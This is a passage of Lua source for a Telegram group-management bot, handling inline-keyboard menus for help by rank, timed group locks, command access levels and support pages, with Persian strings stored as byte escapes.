              redis:hset("GroupSettings:" .. matches[2], "lock_nocaption", "yes")
              GetTools(msg, matches[2])
              if not lang then
                return "Post Without Caption Has Been Enabled!"
              else
                return "\217\190\216\179\216\170 \216\168\216\175\217\136\217\134 \216\178\219\140\216\177\217\134\217\136\219\140\216\179 \217\129\216\185\216\167\217\132 \216\180\216\175!"
              end
            end
          end
          if matches[1] == "ToolsHelp" then
            keyboard = {}
            if not lang then
              text = "`Choose Rank:`"
              keyboard.inline_keyboard = {
                {
                  {
                    text = "Sudo",
                    callback_data = "Help:Sudo:" .. matches[2]
                  },
                  {
                    text = "Owner",
                    callback_data = "Help:Owner:" .. matches[2]
                  },
                  {
                    text = "Moderator",
                    callback_data = "Help:Mods:" .. matches[2]
                  }
                },
                {
                  {
                    text = "Back To other Tools",
                    callback_data = "Tools:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\226\135\177 Back To Manager",
                    callback_data = "Manager:" .. matches[2]
                  }
                }
              }
            else
              text = "`\217\133\217\130\216\167\217\133 \216\177\216\167 \216\167\217\134\216\170\216\174\216\167\216\168 \218\169\217\134\219\140\216\175:`"
              keyboard.inline_keyboard = {
                {
                  {
                    text = "\216\179\217\136\216\175\217\136",
                    callback_data = "Help:Sudo:" .. matches[2]
                  },
                  {
                    text = "\216\181\216\167\216\173\216\168 \218\175\216\177\217\136\217\135",
                    callback_data = "Help:Owner:" .. matches[2]
                  },
                  {
                    text = "\217\133\216\175\219\140\216\177",
                    callback_data = "Help:Mods:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\216\168\216\177\218\175\216\180\216\170 \216\168\217\135 \216\179\216\167\219\140\216\177 \216\167\216\168\216\178\216\167\216\177 \217\135\216\167",
                    callback_data = "Tools:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\216\168\216\177\218\175\216\180\216\170 \216\168\217\135 \217\133\216\175\219\140\216\177\219\140\216\170 \226\135\177",
                    callback_data = "Manager:" .. matches[2]
                  }
                }
              }
            end
            edit_inline(msg.message_id, text, keyboard)
          end
          if matches[1] == "Help:Sudo" then
            keyboard = {}
            if not lang then
              text = GetCmds(redis:get("gp_lang:" .. matches[2])).HelpForSudo
              keyboard.inline_keyboard = {
                {
                  {
                    text = "Sudo",
                    callback_data = "Help:Sudo:" .. matches[2]
                  },
                  {
                    text = "Owner",
                    callback_data = "Help:Owner:" .. matches[2]
                  },
                  {
                    text = "Moderator",
                    callback_data = "Help:Mods:" .. matches[2]
                  }
                },
                {
                  {
                    text = "Back To other Tools",
                    callback_data = "Tools:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\226\135\177 Back To Manager",
                    callback_data = "Manager:" .. matches[2]
                  }
                }
              }
            else
              text = GetCmds(redis:get("gp_lang:" .. matches[2])).HelpForSudo
              keyboard.inline_keyboard = {
                {
                  {
                    text = "\216\179\217\136\216\175\217\136",
                    callback_data = "Help:Sudo:" .. matches[2]
                  },
                  {
                    text = "\216\181\216\167\216\173\216\168 \218\175\216\177\217\136\217\135",
                    callback_data = "Help:Owner:" .. matches[2]
                  },
                  {
                    text = "\217\133\216\175\219\140\216\177",
                    callback_data = "Help:Mods:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\216\168\216\177\218\175\216\180\216\170 \216\168\217\135 \216\179\216\167\219\140\216\177 \216\167\216\168\216\178\216\167\216\177 \217\135\216\167",
                    callback_data = "Tools:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\216\168\216\177\218\175\216\180\216\170 \216\168\217\135 \217\133\216\175\219\140\216\177\219\140\216\170 \226\135\177",
                    callback_data = "Manager:" .. matches[2]
                  }
                }
              }
            end
            edit_inline(msg.message_id, text, keyboard)
          end
          if matches[1] == "Help:Owner" then
            keyboard = {}
            if not lang then
              text = GetCmds(redis:get("gp_lang:" .. matches[2])).HelpForOwner
              keyboard.inline_keyboard = {
                {
                  {
                    text = "Sudo",
                    callback_data = "Help:Sudo:" .. matches[2]
                  },
                  {
                    text = "Owner",
                    callback_data = "Help:Owner:" .. matches[2]
                  },
                  {
                    text = "Moderator",
                    callback_data = "Help:Mods:" .. matches[2]
                  }
                },
                {
                  {
                    text = "Back To other Tools",
                    callback_data = "Tools:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\226\135\177 Back To Manager",
                    callback_data = "Manager:" .. matches[2]
                  }
                }
              }
            else
              text = GetCmds(redis:get("gp_lang:" .. matches[2])).HelpForOwner
              keyboard.inline_keyboard = {
                {
                  {
                    text = "\216\179\217\136\216\175\217\136",
                    callback_data = "Help:Sudo:" .. matches[2]
                  },
                  {
                    text = "\216\181\216\167\216\173\216\168 \218\175\216\177\217\136\217\135",
                    callback_data = "Help:Owner:" .. matches[2]
                  },
                  {
                    text = "\217\133\216\175\219\140\216\177",
                    callback_data = "Help:Mods:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\216\168\216\177\218\175\216\180\216\170 \216\168\217\135 \216\179\216\167\219\140\216\177 \216\167\216\168\216\178\216\167\216\177 \217\135\216\167",
                    callback_data = "Tools:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\216\168\216\177\218\175\216\180\216\170 \216\168\217\135 \217\133\216\175\219\140\216\177\219\140\216\170 \226\135\177",
                    callback_data = "Manager:" .. matches[2]
                  }
                }
              }
            end
            edit_inline(msg.message_id, text, keyboard)
          end
          if matches[1] == "Help:Mods" then
            keyboard = {}
            if not lang then
              text = GetCmds(redis:get("gp_lang:" .. matches[2])).HelpForModerator
              keyboard.inline_keyboard = {
                {
                  {
                    text = "Sudo",
                    callback_data = "Help:Sudo:" .. matches[2]
                  },
                  {
                    text = "Owner",
                    callback_data = "Help:Owner:" .. matches[2]
                  },
                  {
                    text = "Moderator",
                    callback_data = "Help:Mods:" .. matches[2]
                  }
                },
                {
                  {
                    text = "Back To other Tools",
                    callback_data = "Tools:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\226\135\177 Back To Manager",
                    callback_data = "Manager:" .. matches[2]
                  }
                }
              }
            else
              text = GetCmds(redis:get("gp_lang:" .. matches[2])).HelpForModerator
              keyboard.inline_keyboard = {
                {
                  {
                    text = "\216\179\217\136\216\175\217\136",
                    callback_data = "Help:Sudo:" .. matches[2]
                  },
                  {
                    text = "\216\181\216\167\216\173\216\168 \218\175\216\177\217\136\217\135",
                    callback_data = "Help:Owner:" .. matches[2]
                  },
                  {
                    text = "\217\133\216\175\219\140\216\177",
                    callback_data = "Help:Mods:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\216\168\216\177\218\175\216\180\216\170 \216\168\217\135 \216\179\216\167\219\140\216\177 \216\167\216\168\216\178\216\167\216\177 \217\135\216\167",
                    callback_data = "Tools:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\216\168\216\177\218\175\216\180\216\170 \216\168\217\135 \217\133\216\175\219\140\216\177\219\140\216\170 \226\135\177",
                    callback_data = "Manager:" .. matches[2]
                  }
                }
              }
            end
            edit_inline(msg.message_id, text, keyboard)
          end
          function GetToolsLockgp(msg, chat)
            keyboard = {}
            String = tonumber(redis:get("GetInputTimeFor:" .. chat)) or 1
            if not lang then
              text = "`Please Use An item:`"
              keyboard.inline_keyboard = {
                {
                  {
                    text = "<<",
                    callback_data = "-Lockgp:" .. chat
                  },
                  {
                    text = String .. " Hour",
                    callback_data = "NoProcess:" .. chat
                  },
                  {
                    text = ">>",
                    callback_data = "+Lockgp:" .. chat
                  }
                },
                {
                  {
                    text = "Apply Lock",
                    callback_data = "Applylockgp:" .. chat
                  }
                },
                {
                  {
                    text = "Unlock Group",
                    callback_data = "Unlockgp:" .. chat
                  }
                },
                {
                  {
                    text = "Back To other Tools",
                    callback_data = "Tools:" .. chat
                  }
                },
                {
                  {
                    text = "\226\135\177 Back To Manager",
                    callback_data = "Manager:" .. chat
                  }
                }
              }
            else
              text = "`\217\132\216\183\217\129\216\167 \219\140\218\169 \216\168\216\174\216\180 \216\177\216\167 \216\167\217\134\216\170\216\174\216\167\216\168 \218\169\217\134\219\140\216\175:`"
              keyboard.inline_keyboard = {
                {
                  {
                    text = "<<",
                    callback_data = "-Lockgp:" .. chat
                  },
                  {
                    text = String .. " \216\179\216\167\216\185\216\170",
                    callback_data = "NoProcess:" .. chat
                  },
                  {
                    text = ">>",
                    callback_data = "+Lockgp:" .. chat
                  }
                },
                {
                  {
                    text = "\216\167\216\185\217\133\216\167\217\132 \218\169\216\177\216\175\217\134 \217\130\217\129\217\132",
                    callback_data = "Applylockgp:" .. chat
                  }
                },
                {
                  {
                    text = "\216\168\216\167\216\178\218\169\216\177\216\175\217\134 \218\175\216\177\217\136\217\135",
                    callback_data = "Unlockgp:" .. chat
                  }
                },
                {
                  {
                    text = "\216\168\216\177\218\175\216\180\216\170 \216\168\217\135 \216\179\216\167\219\140\216\177 \216\167\216\168\216\178\216\167\216\177 \217\135\216\167",
                    callback_data = "Tools:" .. chat
                  }
                },
                {
                  {
                    text = "\226\135\177 \216\168\216\177\218\175\216\180\216\170 \216\168\217\135 \217\133\216\175\219\140\216\177\219\140\216\170",
                    callback_data = "Manager:" .. chat
                  }
                }
              }
            end
            edit_inline(msg.message_id, text, keyboard)
          end
          if matches[1] == "ToolsLockgp" then
            if not is_owner(matches[2], msg.from.id) then
              get_alert(msg.cb_id, ErrorAccess)
            else
              GetToolsLockgp(msg, matches[2])
            end
          end
          if matches[1] == "-Lockgp" and is_owner(matches[2], msg.from.id) then
            String = tonumber(redis:get("GetInputTimeFor:" .. matches[2])) or 1
            if 1 > String - 1 then
              if not lang then
                return "Input Number is Not Correct!"
              else
                return "\216\170\216\185\216\175\216\167\216\175 \217\136\216\177\217\136\216\175\219\140 \216\181\216\173\219\140\216\173 \217\134\219\140\216\179\216\170!"
              end
            elseif 1 <= String - 1 then
              redis:set("GetInputTimeFor:" .. matches[2], String - 1)
              GetToolsLockgp(msg, matches[2])
            end
          end
          if matches[1] == "+Lockgp" and is_owner(matches[2], msg.from.id) then
            String = tonumber(redis:get("GetInputTimeFor:" .. matches[2])) or 1
            redis:set("GetInputTimeFor:" .. matches[2], String + 1)
            GetToolsLockgp(msg, matches[2])
          end
          if matches[1] == "Applylockgp" and is_owner(matches[2], msg.from.id) then
            String = tonumber(redis:get("GetInputTimeFor:" .. matches[2])) or 1
            T = String * 3600
            redis:setex("~LockGroup~" .. matches[2], T, true)
            if not lang then
              return "Group Locked For " .. String .. " Hour!"
            else
              return "\218\175\216\177\217\136\217\135 \216\168\216\177\216\167\219\140 " .. String .. " \216\179\216\167\216\185\216\170 \217\130\217\129\217\132 \216\180\216\175!"
            end
          end
          if matches[1] == "Unlockgp" and is_owner(matches[2], msg.from.id) then
            String = redis:get("~LockGroup~" .. matches[2])
            if String then
              redis:del("~LockGroup~" .. matches[2])
              if not lang then
                return "Group Unlocked!"
              else
                return "\218\175\216\177\217\136\217\135 \216\168\216\167\216\178 \216\180\216\175!"
              end
            elseif not lang then
              return "Group is Not Locked!"
            else
              return "\218\175\216\177\217\136\217\135 \217\130\217\129\217\132 \217\134\216\168\217\136\216\175!"
            end
          end
          function GetToolsCmds(msg, chat)
            keyboard = {}
            String = redis:get("GroupCmdsAccess:" .. chat)
            if not lang then
              text = [[
`Bot Commands:`

]]
              if String == "owner" then
                text = text .. "Owner and Higher"
              elseif String == "moderator" then
                text = text .. "Moderators and Higher"
              else
                text = text .. "Members and Higher"
              end
              keyboard.inline_keyboard = {
                {
                  {
                    text = "All",
                    callback_data = "Cmds1:" .. chat
                  },
                  {
                    text = "Moderator",
                    callback_data = "Cmds2:" .. chat
                  },
                  {
                    text = "Group owner",
                    callback_data = "Cmds3:" .. chat
                  }
                },
                {
                  {
                    text = "Back To other Tools",
                    callback_data = "Tools:" .. chat
                  }
                },
                {
                  {
                    text = "\226\135\177 Back To Manager",
                    callback_data = "Manager:" .. chat
                  }
                }
              }
            else
              text = "`\216\175\216\179\216\170\217\136\216\177\216\167\216\170 \216\177\216\168\216\167\216\170:`\n\n"
              if String == "owner" then
                text = text .. "\216\181\216\167\216\173\216\168 \218\175\216\177\217\136\217\135 \217\136 \216\168\216\167\217\132\216\167\216\170\216\177"
              elseif String == "moderator" then
                text = text .. "\217\133\216\175\219\140\216\177\216\167\217\134 \218\175\216\177\217\136\217\135 \217\136 \216\168\216\167\217\132\216\167\216\170\216\177"
              else
                text = text .. "\216\162\216\178\216\167\216\175 \216\168\216\177\216\167\219\140 \217\135\217\133\217\135"
              end
              keyboard.inline_keyboard = {
                {
                  {
                    text = "\217\135\217\133\217\135",
                    callback_data = "Cmds1:" .. chat
                  },
                  {
                    text = "\217\133\216\175\219\140\216\177",
                    callback_data = "Cmds2:" .. chat
                  },
                  {
                    text = "\216\181\216\167\216\173\216\168 \218\175\216\177\217\136\217\135",
                    callback_data = "Cmds3:" .. chat
                  }
                },
                {
                  {
                    text = "\216\168\216\177\218\175\216\180\216\170 \216\168\217\135 \216\179\216\167\219\140\216\177 \216\167\216\168\216\178\216\167\216\177 \217\135\216\167",
                    callback_data = "Tools:" .. chat
                  }
                },
                {
                  {
                    text = "\216\168\216\177\218\175\216\180\216\170 \216\168\217\135 \217\133\216\175\219\140\216\177\219\140\216\170 \226\135\177",
                    callback_data = "Manager:" .. chat
                  }
                }
              }
            end
            edit_inline(msg.message_id, text, keyboard)
          end
          if matches[1] == "ToolsCmds" then
            if not is_owner(matches[2], msg.from.id) then
              return ErrorAccess
            else
              GetToolsCmds(msg, matches[2])
            end
          end
          if matches[1] == "Cmds1" and is_owner(matches[2], msg.from.id) then
            redis:del("GroupCmdsAccess:" .. matches[2])
            GetToolsCmds(msg, matches[2])
            if not lang then
              return "Applied"
            else
              return "\216\167\216\185\217\133\216\167\217\132 \216\180\216\175"
            end
          end
          if matches[1] == "Cmds2" and is_owner(matches[2], msg.from.id) then
            redis:set("GroupCmdsAccess:" .. matches[2], "moderator")
            GetToolsCmds(msg, matches[2])
            if not lang then
              return "Applied"
            else
              return "\216\167\216\185\217\133\216\167\217\132 \216\180\216\175"
            end
          end
          if matches[1] == "Cmds3" and is_owner(matches[2], msg.from.id) then
            redis:set("GroupCmdsAccess:" .. matches[2], "owner")
            GetToolsCmds(msg, matches[2])
            if not lang then
              return "Applied"
            else
              return "\216\167\216\185\217\133\216\167\217\132 \216\180\216\175"
            end
          end
          if matches[1] == "Support" then
            keyboard = {}
            if not lang then
              text = redis:get("BotNerkh=") or "`Nerkh Text is Not Set!`"
              keyboard.inline_keyboard = {
                {
                  {
                    text = "Join Support Groups",
                    callback_data = "Supportgp:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\226\153\187\239\184\143 Refresh This Page",
                    callback_data = "Support:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\226\135\177 Back To Manager",
                    callback_data = "Manager:" .. matches[2]
                  }
                }
              }
            else
              text = redis:get("BotNerkh=") or "`\217\133\216\170\217\134 \217\134\216\177\216\174 \216\170\217\134\216\184\219\140\217\133 \217\134\216\180\216\175\217\135 \216\167\216\179\216\170!`"
              keyboard.inline_keyboard = {
                {
                  {
                    text = "\217\136\216\177\217\136\216\175 \216\168\217\135 \218\175\216\177\217\136\217\135 \217\190\216\180\216\170\219\140\216\168\216\167\217\134\219\140",
                    callback_data = "Supportgp:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\226\153\187\239\184\143 \216\170\216\167\216\178\217\135 \216\179\216\167\216\178\219\140 \216\167\219\140\217\134 \216\181\217\129\216\173\217\135",
                    callback_data = "Support:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\216\168\216\177\218\175\216\180\216\170 \216\168\217\135 \217\133\216\175\219\140\216\177\219\140\216\170 \226\135\177",
                    callback_data = "Manager:" .. matches[2]
                  }
                }
              }
            end
            edit_inline(msg.message_id, text, keyboard)
          end
          if matches[1] == "Supportgp" then
            keyboard = {}
            if not lang then
              if redis:get("EditBot:supportgp") then
                text = [[
Support Group:

]] .. redis:get("EditBot:supportgp")
              else
                text = "Support Group is Not Set!"
              end
              keyboard.inline_keyboard = {
                {
                  {
                    text = "Back To Support Part",
                    callback_data = "Support:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\226\135\177 Back To Manager",
                    callback_data = "Manager:" .. matches[2]
                  }
                }
              }
            else
              if redis:get("EditBot:supportgp") then
                text = "\218\175\216\177\217\136\217\135 \217\190\216\180\216\170\219\140\216\168\216\167\217\134\219\140:\n\n" .. redis:get("EditBot:supportgp")
              else
                text = "\218\175\216\177\217\136\217\135 \217\190\216\180\216\170\219\140\216\168\216\167\217\134\219\140 \216\171\216\168\216\170 \217\134\216\180\216\175\217\135 \216\167\216\179\216\170!"
              end
              keyboard.inline_keyboard = {
                {
                  {
                    text = "\216\168\216\177\218\175\216\180\216\170 \216\168\217\135 \216\168\216\174\216\180 \217\190\216\180\216\170\219\140\216\168\216\167\217\134\219\140",
                    callback_data = "Support:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\216\168\216\177\218\175\216\180\216\170 \216\168\217\135 \217\133\216\175\219\140\216\177\219\140\216\170 \226\135\177",
                    callback_data = "Manager:" .. matches[2]
                  }
                }
              }
            end
            edit_inline(msg.message_id, text, keyboard, true)
          end
          if matches[1] == "GetGpCmds" then
            keyboard = {}
            if redis:get("gp_lang:" .. matches[2]) then
              text = "\219\140\218\169 \216\168\216\174\216\180 \216\177\216\167 \216\167\217\134\216\170\216\174\216\167\216\168 \218\169\217\134\219\140\216\175:"
              keyboard.inline_keyboard = {
                {
                  {
                    text = "\216\168\216\174\216\180 \217\133\216\177\216\168\217\136\216\183 \216\168\217\135 \216\179\217\136\216\175\217\136",
                    callback_data = "GetGpCmdsSudo:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\216\175\216\179\216\170\217\136\216\177\216\167\216\170 \216\181\216\167\216\173\216\168\216\167\217\134 \218\175\216\177\217\136\217\135",
                    callback_data = "GetGpCmdsOwner:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\216\175\216\179\216\170\217\136\216\177\216\167\216\170 \217\133\216\175\219\140\216\177\216\167\217\134 \218\175\216\177\217\136\217\135",
                    callback_data = "GetGpCmdsMods:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\216\167\217\133\218\169\216\167\217\134\216\167\216\170 \216\170\217\129\216\177\219\140\216\173\219\140",
                    callback_data = "GetGpCmdsFun:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\216\185\217\132\216\167\217\133\216\170 \216\167\216\168\216\170\216\175\216\167\219\140 \216\175\216\179\216\170\217\136\216\177\216\167\216\170",
                    callback_data = "GetGpCmdsSym:" .. matches[2]
                  }
                },
                {
                  {
                    text = "[ \216\168\216\179\216\170\217\134 ]",
                    callback_data = "GetGpCmdsExit:" .. matches[2]
                  }
                }
              }
            else
              text = "Select a Part:"
              keyboard.inline_keyboard = {
                {
                  {
                    text = "Sudo Part",
                    callback_data = "GetGpCmdsSudo:" .. matches[2]
                  }
                },
                {
                  {
                    text = "Owner Commands",
                    callback_data = "GetGpCmdsOwner:" .. matches[2]
                  }
                },
                {
                  {
                    text = "Moderator Commands",
                    callback_data = "GetGpCmdsMods:" .. matches[2]
                  }
                },
                {
                  {
                    text = "Fun Tools",
                    callback_data = "GetGpCmdsFun:" .. matches[2]
                  }
                },
                {
                  {
                    text = "Commands Symbol",
                    callback_data = "GetGpCmdsSym:" .. matches[2]
                  }
                },
                {
                  {
                    text = "[ Close ]",
                    callback_data = "GetGpCmdsExit:" .. matches[2]
                  }
                }
              }
            end
            edit_inline(msg.message_id, text, keyboard)
          end
          if matches[1] == "GetGpCmdsExit" then
            redis:del("WorkWithManager:" .. msg.message_id .. ":" .. matches[2])
            if not lang then
              text = "Commands Part Has Been Closed By " .. msg.from.name
            else
              text = "\216\168\216\174\216\180 \216\177\216\167\217\135\217\134\217\133\216\167 \216\170\217\136\216\179\216\183 " .. msg.from.name .. " \216\168\216\179\216\170\217\135 \216\180\216\175"
            end
            edit_inline(msg.message_id, text)
          end
          if matches[1] == "GetGpCmdsSym" then
            if _config.cmd == "^" then
              if not lang then
                text = "Commands Has Not Symbol"
              else
                text = "\216\175\216\179\216\170\217\136\216\177\216\167\216\170 \216\168\216\175\217\136\217\134 \216\185\217\132\216\167\217\133\216\170 \217\135\216\179\216\170\217\134\216\175"
              end
            else
              sm = _config.cmd
              Symbol = ""
              if sm:match("!") then
                Symbol = Symbol .. "!"
              end
              if sm:match("/") then
                Symbol = Symbol .. "/"
              end
              if sm:match("#") then
                Symbol = Symbol .. "#"
              end
              if not lang then
                text = "Symbols: " .. Symbol
              else
                text = "\216\185\217\132\216\167\217\133\216\170 \217\135\216\167: " .. Symbol
              end
            end
            return text
          end
          if matches[1] == "GetGpCmdsSudo" then
            if not is_sudo(msg.from.id) then
              return ErrorAccess
            end
            keyboard = {}
            if not lang then
              text = "Sudo Part:"
              keyboard.inline_keyboard = {
                {
                  {
                    text = "install or Remove Groups And Manager",
                    callback_data = "GetGpCmdsSudo1:" .. matches[2]
                  }
                },
                {
                  {
                    text = "Add Reply To Bot",
                    callback_data = "GetGpCmdsSudo2:" .. matches[2]
                  }
                },
                {
                  {
                    text = "Promote A User To Bot Admin",
                    callback_data = "GetGpCmdsSudo3:" .. matches[2]
                  }
                },
                {
                  {
                    text = "Globall Ban A User",
                    callback_data = "GetGpCmdsSudo4:" .. matches[2]
                  }
                },
                {
                  {
                    text = "Work With Edit Bot",
                    callback_data = "GetGpCmdsSudo5:" .. matches[2]
                  }
                },
                {
                  {
                    text = "Change Sudo Access",
                    callback_data = "GetGpCmdsSudo6:" .. matches[2]
                  }
                },
                {
                  {
                    text = "Add or Remove Sudo",
                    callback_data = "GetGpCmdsSudo7:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\226\135\177 Back",
                    callback_data = "GetGpCmds:" .. matches[2]
                  }
                }
              }
            else
              text = "\216\168\216\174\216\180 \217\133\216\177\216\168\217\136\216\183 \216\168\217\135 \216\179\217\136\216\175\217\136:"
              keyboard.inline_keyboard = {
                {
                  {
                    text = "\217\134\216\181\216\168 \219\140\216\167 \216\173\216\176\217\129 \218\175\216\177\217\136\217\135 \217\136 \217\133\216\175\219\140\216\177\219\140\216\170 \216\162\217\134",
                    callback_data = "GetGpCmdsSudo1:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\216\167\216\182\216\167\217\129\217\135 \218\169\216\177\216\175\217\134 \217\190\216\167\216\179\216\174 \216\168\217\135 \216\177\216\168\216\167\216\170",
                    callback_data = "GetGpCmdsSudo2:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\216\167\216\177\216\170\217\130\216\167 \218\169\216\167\216\177\216\168\216\177\216\167\217\134 \216\168\217\135 \216\167\216\175\217\133\219\140\217\134 \216\177\216\168\216\167\216\170",
                    callback_data = "GetGpCmdsSudo3:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\217\133\216\173\216\177\217\136\217\133 \218\169\216\177\216\175\217\134 \217\129\216\177\216\175 \216\167\216\178 \218\175\216\177\217\136\217\135 \217\135\216\167",
                    callback_data = "GetGpCmdsSudo4:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\218\169\216\167\216\177 \216\168\216\167 \217\136\219\140\216\177\216\167\219\140\216\180 \216\177\216\168\216\167\216\170",
                    callback_data = "GetGpCmdsSudo5:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\216\170\216\186\219\140\219\140\216\177 \216\175\216\179\216\170\216\177\216\179\219\140 \216\179\217\136\216\175\217\136 \217\135\216\167",
                    callback_data = "GetGpCmdsSudo6:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\216\167\216\182\216\167\217\129\217\135 \219\140\216\167 \216\173\216\176\217\129 \218\169\216\177\216\175\217\134 \216\179\217\136\216\175\217\136",
                    callback_data = "GetGpCmdsSudo7:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\216\168\216\177\218\175\216\180\216\170 \226\135\177",
                    callback_data = "GetGpCmds:" .. matches[2]
                  }
                }
              }
            end
            edit_inline(msg.message_id, text, keyboard)
          end
          if matches[1] == "GetGpCmdsSudo1" then
            keyboard = {}
            if not lang then
              text = [[
*install or Remove Groups And Manager:*
For install Groups you can use `install` commands, With This commands group was charged for 1 day. if you enter a number front of the commands group charging the same amount

You can remove groups with `remove` commands

For Change groups charge you can use `charge` commands for a certain amount.]]
              keyboard.inline_keyboard = {
                {
                  {
                    text = "\226\135\177 Back",
                    callback_data = "GetGpCmdsSudo:" .. matches[2]
                  }
                }
              }
            else
              text = "`\217\134\216\181\216\168 \219\140\216\167 \216\173\216\176\217\129 \218\175\216\177\217\136\217\135 \217\136 \217\133\216\175\219\140\216\177\219\140\216\170 \216\162\217\134:`\n\216\168\216\177\216\167\219\140 \217\134\216\181\216\168 \218\169\216\177\216\175\217\134 \219\140\218\169 \218\175\216\177\217\136\217\135 \217\133\219\140\216\170\217\136\216\167\217\134\219\140\216\175 \216\167\216\178 \216\175\216\179\216\170\217\136\216\177 install \219\140\216\167 \217\134\216\181\216\168 \218\175\216\177\217\136\217\135 \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \218\169\217\134\219\140\216\175\216\140 \216\167\219\140\217\134 \216\175\216\179\216\170\217\136\216\177 \218\175\216\177\217\136\217\135 \216\177\217\136 \216\168\216\177\216\167\219\140 1 \216\177\217\136\216\178 \216\168\217\135 \216\181\217\136\216\177\216\170 \217\190\219\140\216\180\217\129\216\177\216\182 \216\180\216\167\216\177\218\152 \217\133\219\140\218\169\217\134\216\175\n\216\167\217\133\216\167 \216\167\218\175\216\177 \216\172\217\132\217\136\219\140 \216\167\219\140\217\134 \216\175\216\179\216\170\217\136\216\177 \216\185\216\175\216\175\219\140 \216\168\217\134\217\136\219\140\216\179\219\140\216\175 \218\175\216\177\217\136\217\135 \217\133\217\136\216\177\216\175 \217\134\216\184\216\177 \216\168\217\135 \217\133\219\140\216\178\216\167\217\134 \217\135\217\133\216\167\217\134 \216\185\216\175\216\175 \216\180\216\167\216\177\218\152 \217\133\219\140\216\180\217\136\216\175\n\n\216\168\216\177\216\167\219\140 \216\173\216\176\217\129 \218\175\216\177\217\136\217\135 \217\133\219\140\216\170\217\136\216\167\217\134\219\140\216\175 \216\167\216\178 \216\175\216\179\216\170\217\136\216\177 remove \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \218\169\217\134\219\140\216\175\216\140 \216\167\219\140\217\134 \216\175\216\179\216\170\217\136\216\177 \216\170\217\133\216\167\217\133 \216\170\217\134\216\184\219\140\217\133\216\167\216\170 \218\175\216\177\217\136\217\135 \216\177\216\167 \216\173\216\176\217\129 \217\133\219\140\218\169\217\134\216\175\n\n\216\168\216\177\216\167\219\140 \216\170\216\186\219\140\219\140\216\177 \216\180\216\167\216\177\218\152 \218\175\216\177\217\136\217\135 \217\133\219\140\216\170\217\136\216\167\217\134\219\140\216\175 \216\167\216\178 \216\175\216\179\216\170\217\136\216\177 charge \219\140\216\167 \216\180\216\167\216\177\218\152 \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \218\169\217\134\219\140\216\175 \217\136 \218\175\216\177\217\136\217\135 \216\168\217\135 \217\133\219\140\216\178\216\167\217\134 \217\136\216\177\217\136\216\175\219\140 \216\180\217\133\216\167 \216\180\216\167\216\177\218\152 \217\133\219\140\216\180\217\136\216\175\n\n\216\175\216\179\216\170\217\136\216\177 leave \216\168\216\177\216\167\219\140 \216\174\216\177\217\136\216\172 \216\177\216\168\216\167\216\170 \216\167\216\178 \218\175\216\177\217\136\217\135 \216\168\217\135 \218\169\216\167\216\177 \217\133\219\140 \216\177\217\136\216\175."
              keyboard.inline_keyboard = {
                {
                  {
                    text = "\216\168\216\177\218\175\216\180\216\170 \226\135\177",
                    callback_data = "GetGpCmdsSudo:" .. matches[2]
                  }
                }
              }
            end
            edit_inline(msg.message_id, text, keyboard)
          end
          if matches[1] == "GetGpCmdsSudo2" then
            keyboard = {}
            if not lang then
              text = [[
*Add Reply To Bot:*
For Add reply to bot use: `addreply` {Q} A
`Q` is a question and `A` is an answer
You can delete reply with: `delreply` {Q} A
if you use ALL for answer, all answer of question removed
You can change reply access with: `replyaccess` {Q} A
 A = sudo/owner/moderator/0]]
              keyboard.inline_keyboard = {
                {
                  {
                    text = "\226\135\177 Back",
                    callback_data = "GetGpCmdsSudo:" .. matches[2]
                  }
                }
              }
            else
              text = "`\216\167\216\182\216\167\217\129\217\135 \218\169\216\177\216\175\217\134 \217\190\216\167\216\179\216\174 \216\168\217\135 \216\177\216\168\216\167\216\170:`\n\216\168\216\177\216\167\219\140 \216\167\216\182\216\167\217\129\217\135 \218\169\216\177\216\175\217\134 \217\190\216\167\216\179\216\174 \216\168\217\135 \216\177\216\168\216\167\216\170 \216\167\216\178 \216\175\216\179\216\170\217\136\216\177 \217\133\217\130\216\167\216\168\217\132 \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \218\169\217\134\219\140\216\175: addreply {Q} A\n\216\168\217\135 \216\172\216\167\219\140 Q \216\179\217\136\216\167\217\132 \217\133\217\136\216\177\216\175 \217\134\216\184\216\177 \217\136 \216\168\217\135 \216\172\216\167\219\140 A \216\172\217\136\216\167\216\168 \216\162\217\134 \216\177\216\167 \216\168\217\134\217\136\219\140\216\179\219\140\216\175\n\n\216\168\216\177\216\167\219\140 \216\173\216\176\217\129 \217\190\216\167\216\179\216\174: delreply {Q} A\n\216\167\218\175\216\177 \216\167\216\178 \218\169\217\132\217\133\217\135 ALL \219\140\216\167 \217\135\217\133\217\135 \216\168\217\135 \216\172\216\167\219\140 \216\172\217\136\216\167\216\168 \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \218\169\217\134\219\140\216\175 \216\170\217\133\216\167\217\133\219\140 \217\190\216\167\216\179\216\174 \217\135\216\167\219\140 \216\179\217\136\216\167\217\132 